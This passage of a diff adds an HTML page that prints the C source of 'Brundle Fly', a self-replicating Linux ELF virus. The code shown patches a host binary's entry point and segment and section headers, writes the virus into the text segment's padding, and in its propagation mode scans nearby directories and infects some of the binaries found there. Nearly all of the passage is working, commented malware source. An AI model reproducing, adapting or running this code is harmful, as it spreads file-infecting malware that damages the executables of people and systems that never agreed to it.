+&nbsp;&nbsp;&nbsp; read(src, (char *) phdrs, phdrs_len);
+&nbsp;&nbsp;&nbsp; lseek(src, ehdr.e_shoff, SEEK_SET);
+&nbsp;&nbsp;&nbsp; read(src, (char *) shdrs, shdrs_len);
+
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Iterate through the different program headers and look for a segment
+&nbsp;&nbsp;&nbsp;&nbsp; * that olds the text segment. Also check that this segment has equal
+&nbsp;&nbsp;&nbsp;&nbsp; * memory size and file size. If file size and memory size don't match,
+&nbsp;&nbsp;&nbsp;&nbsp; * this segment has a bss section at the end.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; for (i = 0, ptmp = phdrs; i &lt; ehdr.e_phnum; i++, ptmp++)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ptmp->p_type == PT_LOAD &amp;&amp; ptmp->p_memsz == ptmp->p_filesz)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Oops, we could not find a suitable text segment, time to leave,
+&nbsp;&nbsp;&nbsp;&nbsp; * there is nothing to do, this file is already broken.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (i == ehdr.e_phnum)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Set virt_start to the virtual address the virus will start at and
+&nbsp;&nbsp;&nbsp;&nbsp; * set real_start to the physical address the virus will start at.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; virt_start = ptmp->p_vaddr + ptmp->p_filesz;
+&nbsp;&nbsp;&nbsp; real_start = ptmp->p_offset + ptmp->p_filesz;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Patch the virus code for our victim host. Set the host_entry variable
+&nbsp;&nbsp;&nbsp;&nbsp; * to point to ehdr.entry and the set virus_start to real_start (done by
+&nbsp;&nbsp;&nbsp;&nbsp; * using our varibale virus_start_off).
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; *(int *) &amp;virus_data[host_entry] = ehdr.e_entry;
+&nbsp;&nbsp;&nbsp; *(int *) &amp;virus_data[virus_start_off] = real_start;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * After saving the ehdr.entry in host_entry, override it in the ELF
+&nbsp;&nbsp;&nbsp;&nbsp; * header by our virus_entry + the virutal address the virus starts at.
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; ehdr.e_entry = virt_start + virus_entry;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * We increased the text segment, therefore adjust the size of this
+&nbsp;&nbsp;&nbsp;&nbsp; * segment in memory and in the file.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; ptmp->p_memsz = ptmp->p_filesz += virus_length;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Check if there is enough space in the text segment for Brundle Fly.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * This is done by &amp; (PAGE_SIZE - 1) (similar to a modulus instruction,
+&nbsp;&nbsp;&nbsp;&nbsp; * but shorter).&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (PAGE_SIZE - (virt_start &amp; (PAGE_SIZE - 1)) &lt; virus_length)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * The file size has been increased, therefore it is necessary to&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * adjust the offset of all following program headers.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; for (i++, ptmp++; i &lt; ehdr.e_phnum; i++, ptmp++)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ptmp->p_offset += PAGE_SIZE;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Same goes for the section headers. All section headers after the
+&nbsp;&nbsp;&nbsp;&nbsp; * injected virus have to be adjusted. The section that close to our
+&nbsp;&nbsp;&nbsp;&nbsp; * code has to be increased.
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; for (i = 0, stmp = shdrs; i &lt; ehdr.e_shnum; i++, stmp++)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (stmp->sh_offset >= real_start)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stmp->sh_offset += PAGE_SIZE;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (stmp->sh_addr + stmp->sh_size == virt_start)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stmp->sh_size += virus_length;
+
+&nbsp;&nbsp;&nbsp; secstart = ehdr.e_shoff;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * If Brundle Fly was injected before ALL sections adjust the section
+&nbsp;&nbsp;&nbsp;&nbsp; * offset in the ELF header.
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; if (ehdr.e_shoff >= real_start)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ehdr.e_shoff += PAGE_SIZE;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Write the patched ELF header and the program headers to our temporary
+&nbsp;&nbsp;&nbsp;&nbsp; * file.
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; write(dst, (char *) &amp;ehdr, sizeof(Elf_Ehdr));
+&nbsp;&nbsp;&nbsp; write(dst, (char *) phdrs, phdrs_len);
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Set the position in our source file.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; position = phdrs_len + sizeof(Elf_Ehdr);
+&nbsp;&nbsp;&nbsp; lseek(src, position, SEEK_SET);
+
+&nbsp;&nbsp;&nbsp; /*&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * Copy all data from the end of the program headers to the start
+&nbsp;&nbsp;&nbsp;&nbsp; * of the virus.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; copy(src, dst, real_start - position);
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Insert the virus. Actually the virus length is below PAGE_SIZE,
+&nbsp;&nbsp;&nbsp;&nbsp; * but we need to write a complete page. If there is junk at the&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * end of virus_data, no problem, noone cares.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; write(dst, virus_data, PAGE_SIZE);
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Copy all data from the end of the virus to the start of the
+&nbsp;&nbsp;&nbsp;&nbsp; * section headers.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; copy(src, dst, secstart - real_start);
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Write the patched section headers.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; write(dst, (char *) shdrs, shdrs_len);
+
+&nbsp;&nbsp;&nbsp; /*&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * Now copy the rest to our temporary file.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; position += shdrs_len + secstart - position;
+&nbsp;&nbsp;&nbsp; copy(src, dst, (st.st_size - position));
+
+&nbsp;&nbsp;&nbsp; close(src);
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Rename our temporary file to the host file, set the original mode
+&nbsp;&nbsp;&nbsp;&nbsp; * and ownership. Voila.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; rename(tmp, host);
+&nbsp;&nbsp;&nbsp; fchmod(dst, st.st_mode);
+&nbsp;&nbsp;&nbsp; fchown(dst, st.st_uid, st.st_gid);
+&nbsp;&nbsp;&nbsp; close(dst);
+
+&nbsp;&nbsp;&nbsp; return 1;
+&nbsp; error:
+&nbsp;&nbsp;&nbsp; return 0;
+}
+
+/*&nbsp;
+&nbsp;* This is the main function of Brundle Fly. It is used to receive the&nbsp;
+&nbsp;* argument argv[0] that olds the filename of the source.&nbsp;
+&nbsp;*/
+int main(int argc, char *argv[])
+{
+&nbsp;&nbsp;&nbsp; struct dirent *d;
+&nbsp;&nbsp;&nbsp; int dir, i, count, filename, j;
+
+&nbsp;&nbsp;&nbsp; char *s0 = "./", *s1 = ".././", *s2 = "../.././";
+&nbsp;&nbsp;&nbsp; char *path_env = "/bin/:/usr/bin/:/usr/sbin/:/usr/local/bin/:./bin/:";
+&nbsp;&nbsp;&nbsp; char *source, *path, *ptr1, *ptr2, *ptr3;
+&nbsp;&nbsp;&nbsp; char dirents[PAGE_SIZE], buf[256];
+
+&nbsp;&nbsp;&nbsp; source = get_path((char *) argv, buf, path_env);
+
+#ifdef PROPAGATION
+
+&nbsp;&nbsp;&nbsp; /*&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * If compiled with PROPAGATION, get the current unix time and select
+&nbsp;&nbsp;&nbsp;&nbsp; * either to search the dir ., .. or even ../...&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; j = time(0);
+&nbsp;&nbsp;&nbsp; switch (j % 3) {
+&nbsp;&nbsp;&nbsp; case 0:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path = s0;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+&nbsp;&nbsp;&nbsp; case 1:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path = s1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;
+&nbsp;&nbsp;&nbsp; case 2:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path = s2;
+&nbsp;&nbsp;&nbsp; }
+
+&nbsp;&nbsp;&nbsp; if ((dir = open(path, O_RDONLY, 0)) &lt; 0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Get the directory entries for the selected directory. Only PAGE_SIZE
+&nbsp;&nbsp;&nbsp;&nbsp; * is provided for temporary storage.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; count = getdents(dir, (struct dirent *) &amp;dirents, PAGE_SIZE);
+&nbsp;&nbsp;&nbsp; close(dir);
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Allocate memory for our filename.
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; filename = brk(0);
+&nbsp;&nbsp;&nbsp; if (brk(filename + 256) &lt; filename + 256)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto error;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Perpare several pointers, this is weird code. Since we may not&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * use any data stored in the .data segment, we have to work with a&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * lot of pointers that are stored on the stack.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; ptr1 = (char *) filename;
+&nbsp;&nbsp;&nbsp; d = (struct dirent *) &amp;dirents;
+
+&nbsp;&nbsp;&nbsp; for (; *path != 0; ptr1++, path++)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *ptr1 = *path;
+&nbsp;&nbsp;&nbsp; ptr3 = ptr1;
+
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * Iterate through the directory and infect a binary with a rate of
+&nbsp;&nbsp;&nbsp;&nbsp; * INFECTION_RATE.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; for (i = 0; i &lt; count &amp;&amp; i &lt; PAGE_SIZE &amp;&amp; d->d_reclen;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i += d->d_reclen) {
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (j % INFECTION_RATE == 0) {
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (ptr2 = d->d_name; *ptr2 != 0; ptr1++, ptr2++)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *ptr1 = *ptr2;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *ptr1 = 0;
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inject((char *) filename, source, ".. ");
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ptr1 = ptr3;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d = (struct dirent *) (((char *) d) + d->d_reclen);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j++;
+&nbsp;&nbsp;&nbsp; }
+#else
+&nbsp;&nbsp;&nbsp; /*
+&nbsp;&nbsp;&nbsp;&nbsp; * In non-propagation mode, just in fact the file ./host. This is a&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; * good way to test the virus.&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; */
+&nbsp;&nbsp;&nbsp; inject("./host", source, ".. ");
+#endif
+
+#ifndef SILENT
+&nbsp;&nbsp;&nbsp; write(1, "WARNING: brundle-fly infected!\n", 31);
+#endif
+
+&nbsp; error:
+&nbsp;&nbsp;&nbsp; return 0;
+}</tt>
+
+</pre>
+</blockquote>
+</td>
+</tr>
+</table>
+
+</body>
+</html>
